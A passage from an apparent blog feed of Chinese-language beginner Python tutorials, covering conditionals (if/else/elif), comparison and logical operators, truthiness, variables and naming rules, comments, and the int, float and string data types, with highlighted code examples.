    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"if代码块结束"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"程序结束"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码是从上往下一行一行的执行的，首先会打印<code>程序开始</code>，进入条件的判断，<code>10 &gt; 3</code>成立，结果为True，所以进入代码块，执行代码块中的三条语句，最后一行代码的缩进与前面的不同，所以<code>if</code>的代码块已结束，执行最后一行语句，最终输出如下：</p>
<pre class="line-numbers language-none"><code class="language-none">程序开始
if代码块开始
10是大于3的
if代码块结束
程序结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="关键字-else"><a href="#关键字-else" class="headerlink" title="关键字-else"></a>关键字-else</h3><p>我们还可以用关键字<code>else</code>形成的<code>else</code>语句，追加一个代码块，来表示条件不成立时执行：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">age <span class="token operator">=</span> <span class="token number">17</span>
<span class="token keyword">if</span> age <span class="token operator">>=</span> <span class="token number">18</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你是个成年人"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你还未成年"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的代码中，条件<code>age&gt;=18</code>不成立，为False，进入<code>else</code>的代码块，所以输出为：</p>
<pre class="line-numbers language-none"><code class="language-none">你还未成年<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="关键字-elif"><a href="#关键字-elif" class="headerlink" title="关键字-elif"></a>关键字-elif</h3><p>上面的例子中，仅仅做了一个条件的判断，如果18岁以下再细分为16岁以上和16岁以下要怎么做才好？</p>
<p>或许有些读者还是很聪明的。我们可以在<code>else</code>语句中，嵌套一个代码块，像这样：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">age <span class="token operator">=</span> <span class="token number">17</span>
<span class="token keyword">if</span> age <span class="token operator">>=</span> <span class="token number">18</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你是个成年人"</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> age <span class="token operator">>=</span> <span class="token number">16</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你还未成年，但你已经超过16岁了！"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你还没到16岁"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的代码可以解决刚刚提出的问题，可是如果16岁以下还要细分怎么办？再嵌套？</p>
<p>当然不行，如果嵌套过多会出现如下情况：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> condition1<span class="token punctuation">:</span>
    code1
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> condition2<span class="token punctuation">:</span>
        code2
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> condition3<span class="token punctuation">:</span>
            code3
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> condition4<span class="token punctuation">:</span>
                code4
            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这就像是灾难！代码不仅不美观，而且可读性变差，不易于理解。</p>
<p>那么怎么办？</p>
<p><code>elif</code>该登场了<code>&lt;(￣︶￣)&gt;</code>，用上<code>elif</code>语句后，问题迎刃而解：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">age<span class="token operator">=</span><span class="token number">8</span>
<span class="token keyword">if</span> age <span class="token operator">>=</span> <span class="token number">18</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你是个成年人"</span><span class="token punctuation">)</span>
<span class="token keyword">elif</span> age <span class="token operator">>=</span> <span class="token number">16</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你还未成年，但你已经超过16岁了"</span><span class="token punctuation">)</span>
<span class="token keyword">elif</span> age <span class="token operator">>=</span><span class="token number">14</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你还是个14岁不到的小孩，无忧无虑"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的<code>if</code>条件不成立，所以跳到第一个<code>elif</code>中继续判断条件，条件仍然不成立，到下一个<code>elif</code>中继续判断，条件成立，程序输出：</p>
<pre class="line-numbers language-none"><code class="language-none">你还是个14岁不到的小孩，无忧无虑<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>通常在写代码中很少直接出现布尔值<code>True</code>和<code>False</code>，而是通过比较运算得出来的，像上面的<code>&gt;=</code>、<code>&gt;</code>就是比较运算符了，下面是python所有的比较运算符：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>意义</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td>==</td>
<td>等于</td>
<td><code>1==1</code>为True，<code>1==2</code>为False</td>
</tr>
<tr>
<td>!=</td>
<td>不等于</td>
<td><code>1!=2</code>为True，<code>1!=1</code>为False</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于</td>
<td><code>2&gt;1</code>为True，<code>3&gt;5</code>为False</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于或等于</td>
<td><code>2&gt;=1</code>为True，<code>2&gt;=2</code>为True，<code>3&gt;=4</code>为False</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于</td>
<td><code>1&lt;2</code>为True，<code>2&lt;1</code>为False</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于或等于</td>
<td><code>1&lt;=2</code>为True，<code>2&lt;=2</code>为True，<code>4&lt;=3</code>为False</td>
</tr>
</tbody></table>
<p><strong>注意</strong>：其中的“等于”用的是连续的两个等号<code>==</code>，而一个等号<code>=</code>是赋值运算符，不要写错了。</p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>其实之前讲布尔类型的时候也提到过逻辑运算符，同样给出一个表格：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>意义</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td>and</td>
<td>并且，数学中的 且（∧），两个都为True才为True</td>
<td><code>100&gt;3 and 3&lt;=4</code>为True</td>
</tr>
<tr>
<td>or</td>
<td>或者，数学中的或（∨），其中一个为True就为True</td>
<td><code>1&gt;2 or 5&gt;6</code>为False</td>
</tr>
<tr>
<td>not</td>
<td>非，数学中的非（┐），取反</td>
<td><code>not True</code>为False，<code>not False</code>为True</td>
</tr>
</tbody></table>
<p>多用用就可以记住了，读者们没必要死记硬背。</p>
<h3 id="再谈布尔类型"><a href="#再谈布尔类型" class="headerlink" title="再谈布尔类型"></a>再谈布尔类型</h3><p>先来运行下面的代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token number">0</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
    
<span class="token keyword">if</span> <span class="token number">1</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token number">2</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token string">'abc'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序输出了：</p>
<pre class="line-numbers language-none"><code class="language-none">1
2
abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这是什么回事？？为什么1与True有同样的效果？？为什么0与False有同样的效果？？……</p>
<p>其实这是python自动的将一些值转换成了布尔类型，不同的数据类型有不同的转换方式，常见的有以下的几种：</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>转换方式</th>
</tr>
</thead>
<tbody><tr>
<td>整数int</td>
<td><code>0</code>转换成<code>False</code>，其它值转换成<code>True</code></td>
</tr>
<tr>
<td>浮点数float</td>
<td><code>0.0</code>转换成<code>False</code>，其它值转换成<code>True</code></td>
</tr>
<tr>
<td>字符串str</td>
<td>空串<code>&quot;&quot;</code>转换成<code>False</code>，其它转换成<code>True</code></td>
</tr>
<tr>
<td>列表list</td>
<td>空列表<code>[]</code>转换成<code>False</code>，其它转换成<code>True</code></td>
</tr>
<tr>
<td>字典dict</td>
<td>空字典<code>&#123;&#125;</code>转换成<code>False</code>，其它转换成<code>True</code></td>
</tr>
<tr>
<td>集合set</td>
<td>空集合<code>set()</code>转换成<code>False</code>，其他转换成<code>True</code></td>
</tr>
</tbody></table>
<p>后面三个是即将要学到的三种数据结构，是python的基本数据类型，可先忽略。</p>
<p>如果不清楚转换方式，可以自己手动转换看看结果，用<code>bool()</code>包起来，如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token boolean">False</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>注意</strong>：上面用词为“转换”，意味着不是“等于”，也就是说，<code>123</code>不等于<code>True</code>，只是转换之后是<code>True</code>，我们可以实验一下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">123</span><span class="token operator">==</span><span class="token boolean">True</span>
<span class="token boolean">False</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token operator">==</span><span class="token boolean">False</span>
<span class="token boolean">False</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">0</span><span class="token operator">==</span><span class="token boolean">False</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span><span class="token operator">==</span><span class="token boolean">True</span>
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>刚才说过了，“转换”不意味着“等于”，所以前面两个的结果当然是<code>False</code>了，可是，后两个为什么是<code>True</code>？</p>
<p>这个嘛，在python中bool类型是int类型的一个子类型（暂且这么说），<code>True</code>其实就是用数值<code>1</code>来表示的，<code>False</code>是用<code>0</code>来表示的，所以……希望读者不会晕<code>(@_@)</code></p>
<hr>
<p>没想到这一节挺长的，读者好好消化吧。</p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（二）·变量</title>
    <url>/3eebeec5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>什么是变量？在百度百科中，<a href="https://baike.baidu.com/item/%E5%8F%98%E9%87%8F/3956968?fr=aladdin">变量</a>的解释是：</p>
<blockquote>
<p>变量来源于数学，是计算机语言中能储存计算结果或能表示值抽象概念。变量可以通过……</p>
</blockquote>
<p>这是一段很长很长的解释，其实，作者认为没必要这么机械式的去理解。简单说，<span id="more"></span>变量就是一个“盒子”，这个“盒子”可以装一些数据，当然，这些数据的类型可以是任意的，因为归根结底，任何类型的数据在内存中的表示都是二进制0、1组合。</p>
<hr>
<h2 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h2><p>先从一段代码说起：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">123</span>
b <span class="token operator">=</span> <span class="token number">456</span>
c <span class="token operator">=</span> <span class="token string">"a + b ="</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> a<span class="token operator">+</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后输出：</p>
<pre class="line-numbers language-none"><code class="language-none">a + b &#x3D; 579<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>代码中就使用了三个变量：<code>a</code>、<code>b</code>和<code>c</code>，并在<code>print</code>中使用。第1行<code>a = 123</code>就创建了一个变量，变量名为<code>a</code>，2、3行同样也创建了变量，不同的是，变量<code>a</code>和<code>b</code>整数型的，而变量<code>c</code>的类型是字符串类型，这不同于C语言，在C语言中，使用变量之前是需要“声明”类型的，而在python中，在通过等号<code>=</code>赋值后，就创建了一个变量，变量的类型是python自动识别的。</p>
<h3 id="创建变量"><a href="#创建变量" class="headerlink" title="创建变量"></a>创建变量</h3><p>前面说过，变量在赋值后被创建，赋值运算符是等号<code>=</code>，等号<code>=</code>左边是变量名，右边是存储在变量中的值。变量创建后，可以同过变量名来使用变量。例如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">'Mike'</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'My name is'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>

a <span class="token operator">=</span> <span class="token number">123</span>
b <span class="token operator">=</span> <span class="token number">456</span>
c <span class="token operator">=</span> a <span class="token operator">+</span> b

<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">,</span> c <span class="token punctuation">)</span>  <span class="token comment"># 123 + 456 = 579</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>赋值运算符是<strong>从右往左</strong>执行的，在<code>c = a + b</code>中，先对右边的<code>a + b</code>求值，在赋值给变量<code>c</code>。</p>
<p>读者可以复制上面代码，保存到文件再运行试试。</p>
<hr>
<h3 id="多个变量赋值"><a href="#多个变量赋值" class="headerlink" title="多个变量赋值"></a>多个变量赋值</h3><p>python可以同时给多个变量赋值，比如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> b <span class="token operator">=</span> c <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>前面说到了，赋值运算符是从右往左执行的，而赋值语句本身也是有值的，语句<code>a = 1</code>的值是<code>1</code>，学过C语言的同学或许很清楚，所以上面例子等价于：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token number">1</span>
b <span class="token operator">=</span> c
a <span class="token operator">=</span> b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>注意咯，<code>a = b = c</code> 是等价于<code>a = b;b = c</code>（在同一行中写两句以上代码可用分号<code>;</code>分开），而不是等价于<code>a=c;b=c</code>，其实只要记住了 <strong>“赋值运算符是从右往左执行的”</strong> 这句话就OK了。</p>
<p>还有一种多个变量同时赋值的操作，像这样：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>显而易见，右边的值<code>1</code>、<code>2</code>、<code>&#39;hello&#39;</code>依次分配给<code>a</code>、<code>b</code>、<code>c</code>。</p>
<h3 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h3><p>变量的命名可不是爱怎么来就怎么来的，是有一定的语法规则的：</p>
<ol>
<li>变量名使用的字符必须是字母、数字、或者下划线<code>_</code></li>
<li>变量名的第一个字符不可以是数字</li>
<li>不能使用关键字作为变量名</li>
</ol>
<p>这三条规则几乎在所有计算机语言中通用，变量名使用的字符只能是字母<code>a~z</code>或大写<code>A～Z</code>，数字<code>0～9</code>，或者下划线<code>_</code>，并且第一个字符不可以是数字。</p>
<p>针对第三点，在计算机语言中，会有一些有特殊意义，用于语法的单词，称为 <strong>“关键字”</strong>，您可以在python的交互式解释器中输入<code>help(&#39;keywords&#39;)</code>查看python的所有关键字，还是演示一下吧：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">help</span><span class="token punctuation">(</span><span class="token string">'keywords'</span><span class="token punctuation">)</span>

Here <span class="token keyword">is</span> a <span class="token builtin">list</span> of the Python keywords<span class="token punctuation">.</span>  Enter <span class="token builtin">any</span> keyword to get more <span class="token builtin">help</span><span class="token punctuation">.</span>

<span class="token boolean">False</span>               <span class="token keyword">class</span>               <span class="token class-name">from</span>                <span class="token keyword">or</span>
<span class="token boolean">None</span>                <span class="token keyword">continue</span>            <span class="token keyword">global</span>              <span class="token keyword">pass</span>
<span class="token boolean">True</span>                <span class="token keyword">def</span>                 <span class="token keyword">if</span>                  <span class="token keyword">raise</span>
<span class="token keyword">and</span>                 <span class="token keyword">del</span>                 <span class="token keyword">import</span>              <span class="token keyword">return</span>
<span class="token keyword">as</span>                  <span class="token keyword">elif</span>                <span class="token keyword">in</span>                  <span class="token keyword">try</span>
<span class="token keyword">assert</span>              <span class="token keyword">else</span>                <span class="token keyword">is</span>                  <span class="token keyword">while</span>
<span class="token keyword">async</span>               <span class="token keyword">except</span>              <span class="token keyword">lambda</span>              <span class="token keyword">with</span>
<span class="token keyword">await</span>               <span class="token keyword">finally</span>             <span class="token keyword">nonlocal</span>            <span class="token keyword">yield</span>
<span class="token keyword">break</span>               <span class="token keyword">for</span>                 <span class="token keyword">not</span>                 

<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>让我们看看几个例子，以下几个变量名是有效的：</p>
<pre class="line-numbers language-none"><code class="language-none">counter
_abc
my_name
a1
a2b_cD
A1
def_123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而以下几个变量名是无效的：</p>
<pre class="line-numbers language-none"><code class="language-none">1ae          变量名不能以数字开头
a*b          变量名只能包含字母、数字和下划线_
def          def是python中的关键字<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="变量命名规范"><a href="#变量命名规范" class="headerlink" title="变量命名规范"></a>变量命名规范</h3><p>注意小标题，是 <strong>“规范”</strong>，不是 <strong>“规则”</strong>，这是不一样的，规则是人家python定死的，必须遵守，否则就是语法错误了，而规范是人们的一种共识，方便的是人，相信我，按照规范来，你会感谢我的<code>&lt;(￣︶￣)&gt;</code></p>
<p>一些常见的命名规范如下：</p>
<ol>
<li>变量名尽量有意义，如 <code>name</code>表示存储名字的变量</li>
<li>单词用小写，单词之间用下划线隔开，如<code>my_name</code>，或者用“驼峰命名法”，即除第一个以外的单词的首字母大写，如<code>myName</code>，最好不要混合使用。</li>
</ol>
<p>这仅仅是变量的命名规范，在程序中还有很多要命名的东西，如函数、类、包……现在就先到这，等讲到了会一一说明的。</p>
<hr>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>不知道读者是否有注意到，前文讲变量的创建的时候，有一行这样的代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">,</span> c <span class="token punctuation">)</span>  <span class="token comment"># 123 + 456 = 579</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>上面有一行<code># 123 + 456 = 579</code>作者并没有解释，而运行过代码的同学会发现，程序输出<code>123 + 456 = 579</code>，难道加了这句程序就输出这个？现在请读者把<code># 123 + 456 = 579</code>一句删除再运行试试……</p>
<p>怎么回事？程序的输出和之前一样？这东西到底是何方神圣？作者就不再绕关子了，这行字符叫做 <strong>“注释”</strong>，它的有无对程序的运行没有任何影响，它是为了在程序中解释代码的用途，方便人理解用的。</p>
<h3 id="注释的使用"><a href="#注释的使用" class="headerlink" title="注释的使用"></a>注释的使用</h3><p>python的注释有多种方式，话不多说，在这里直接上代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 这是单行注释</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span> <span class="token comment"># 从符号井号开始到行末是注释</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"#这不是注释，这是字符串"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"字符串"</span><span class="token punctuation">)</span><span class="token comment">#这是注释，不是字符串")</span>

<span class="token triple-quoted-string string">"""
这是多行注释，用一对三个双引号括起。
"""</span>

<span class="token triple-quoted-string string">'''
这也是多行注释，用一对三个单引号括起。
'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>终于写完了<code>&lt;(￣︶￣)&gt;</code>，下期再见……</p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（二）·数据类型</title>
    <url>/bdb8174f/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>数据类型，顾名思义就是数据的类型，数据到底有哪些类型呢？在python中，最基本的数据类型有好几种，让我来逐个介绍。<span id="more"></span></p>
<h3 id="整数类型（int）"><a href="#整数类型（int）" class="headerlink" title="整数类型（int）"></a>整数类型（int）</h3><p>python中只有一种整数类型，就是int类型，在程序中的写法和运算和数学一般相同，如<code>123</code>、<code>-456</code>等。除此之外，还可以用其它的表示方法：</p>
<ul>
<li>前缀<code>0b</code>，是零和字母<code>b</code>（大写<code>B</code>也可以），表示这是一个二进制数，如<code>0b110</code></li>
<li>前缀<code>0o</code>，是零和字母<code>o</code>（大写<code>O</code>也可以），表示这是一个八进制数，如<code>0o10</code></li>
<li>前缀<code>0x</code>，是零和字母<code>x</code>（大写<code>X</code>也可以），表示这是一个十六进制数，如<code>0x1a</code></li>
</ul>
<p>要注意的是，无论是哪一种写法，整数在计算机中的存储形式都是一样的，都是一些0、1组合，不要以为十进制<code>16</code>在程序中写成<code>0x10</code>就不是同一个数了，有这么多种表示方式是为了方便人而不是计算机。</p>
<p>前面也接触到了，整数可以进行加减乘除等数学计算，如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">123</span><span class="token operator">+</span><span class="token number">456</span>
<span class="token number">579</span>
<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="浮点数（float）"><a href="#浮点数（float）" class="headerlink" title="浮点数（float）"></a>浮点数（float）</h3><p>浮点数就是小数，如<code>1.2</code>，<code>1.3</code>等，浮点数的写法还可以是科学计数法，如1.23x10<sup>4</sup>在程序中表示为<code>1.23e4</code>或<code>12.3e3</code>，1.2x10<sup>-3</sup>可以表示为<code>1.2e-3</code>等，也就是说用字母<code>e</code>（或<code>E</code>）代替10。</p>
<p>由于整数和浮点数在计算机内部存储方式不同，整数运算是完全准确的，而浮点数的运算是有误差的，具体原因可以百度 <strong>“浮点数误差”</strong></p>
<p>前面提到的<code>//</code>运算符，其实是整数除法的运算符，整数和整数运算，结果还是整数，也就是说，10除以3结果应该是3<strong>而不是3.33</strong>……，这就是为什么我说整数运算是准确的。</p>
<p>而<code>/</code>是浮点数的除法运算符，python是将整数类型自动地转化为浮点数再进行浮点数运算，最后的结果自然也是浮点数了。</p>
<h3 id="字符串类型（str）"><a href="#字符串类型（str）" class="headerlink" title="字符串类型（str）"></a>字符串类型（str）</h3><p>字符串是用一对单引号<code>&#39;</code>或一对双引号<code>&quot;</code>括起来的文本，如<code>&#39;123&#39;</code>，<code>&quot;456&quot;</code>。引号<code>&#39;</code>、<code>&quot;</code>只是用来表示字符串，不是字符串的一部分，如<code>&#39;123&#39;</code>只是一串<strong>字符</strong><code>1</code>、<code>2</code>、<code>3</code>，如果字符串中包含单引号<code>&#39;</code>那么可以用双引号括起：<code>&quot;单引号（&#39;）&quot;</code>，同理，若字符串中包含双引号，可以是用单引号来表示：<code>&#39;双引号（&quot;）&#39;</code>。</p>
<p>如果字符串中即有单引号又有双引号呢？这时就需要用转义字符<code>\</code>了，比如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">"这有一个单引号\'，还有一个双引号\""</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>表示的字符串是：</p>
<pre class="line-numbers language-none"><code class="language-none">这有一个单引号&#39;，还有一个双引号&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>转义字符<code>\</code>常用于表示一些无法用键盘打出来的字符，如换行符<code>\n</code>，<code>print()</code>默认在输出字符串后换行，就是自动加了换行符<code>\n</code>，制表府<code>\t</code>，而<code>\\</code>表示字符<code>\</code>本身。</p>
<p>用<code>print()</code>打印些字符串试试：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"制表符\t制表符"</span><span class="token punctuation">)</span>
制表符	制表符
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"换行符\n换行符"</span><span class="token punctuation">)</span>
换行符
换行符
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\\是转义字符"</span><span class="token punctuation">)</span>
\是转义字符
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果字符串中有很多字符需要转义，每一个都加上<code>\</code>？这也太麻烦了，python还有一种更简单的表示方法，字符串引号前加一个前缀<code>r</code>，表示raw字符串，raw是原生的意思，也就是说，你看到的是什么字符就是什么字符，即不转义。如：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">r"换行符为\n"</span><span class="token punctuation">,</span> <span class="token string">r"转义符为\\"</span><span class="token punctuation">,</span> <span class="token string">r"制表符为\t"</span><span class="token punctuation">,</span> <span class="token string">r"引号为\'和\""</span><span class="token punctuation">)</span>
换行符为\n 转义符为\\ 制表符为\t 引号为\'和\"
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>当然啦，如果你要换行，那么就不能写成<code>r&quot;\n&quot;</code>了，因为<code>r&quot;&quot;</code>中的字符串是不转义的，如果有很多换行，还可以用这种形式，<code>&#39;&#39;&#39;字符串&#39;&#39;&#39;</code>或<code>&quot;&quot;&quot;字符串&quot;&quot;&quot;</code>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
... 第一行
... 第二行
... 第三行
... '''</span><span class="token punctuation">)</span>

第一行
第二行
第三行

<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

